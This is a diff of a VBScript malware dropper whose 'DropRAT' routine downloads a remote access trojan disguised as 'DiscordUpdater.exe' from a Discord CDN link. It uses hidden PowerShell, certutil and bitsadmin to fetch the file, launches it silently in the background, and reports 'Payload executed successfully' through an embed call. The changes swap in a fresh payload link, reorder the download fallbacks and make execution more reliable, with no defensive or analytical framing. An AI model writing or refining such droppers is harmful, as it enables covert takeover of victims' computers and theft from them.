@@ -145,29 +145,35 @@ End Sub
 ' --- DropRAT ---
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
-    Dim dl: dl = "https://cdn.discordapp.com/attachments/1548568579442479154/1564100269350985750/DiscordUpdater.exe?ex=6ae00963&is=6adeb7e3&hm=9db3df5d18a3377d1a1e916c594b338480204c090af26d5a995cb163275ef083&"
+    
+    ' FRESH LINK EXTRACTED FROM SCREENSHOT
+    Dim dl: dl = "https://cdn.discordapp.com/attachments/1548568579442479154/1564110158945325147/DiscordUpdater.exe?ex=6ae01299&is=6adec119&hm=b9bd7c7899a4d7640931a4c5155b4b162ccaab2e8eddf8979a2d850c7016663d&"
     
     If fso.FileExists(temp) Then fso.DeleteFile temp
 
-    ' Try bitsadmin first
-    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    
+    ' Try PowerShell first (most reliable)
+    Dim psCmd : psCmd = "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'"""
+    sh.Run psCmd, 0, True
+
     ' Fallback: certutil
     If Not fso.FileExists(temp) Then
         sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     End If
     
-    ' Fallback: PowerShell
+    ' Fallback: bitsadmin
     If Not fso.FileExists(temp) Then
-        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+        sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     End If
     
     ' Run if downloaded
     If fso.FileExists(temp) Then
-        sh.Run Chr(34) & temp & Chr(34), 0, False
+        ' Change working dir to TEMP to avoid missing DLL issues
+        sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
+        ' Launch detached
+        sh.Run "cmd.exe /c start """" """ & temp & """", 0, False
         Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
     Else
-        Call PostEmbed("⌛ RAT Error", "Download failed on all methods.", 16711680)
+        Call PostEmbed("⌛ RAT Error", "Download failed. Link might be expired.", 16711680)
     End If
 End Sub
 
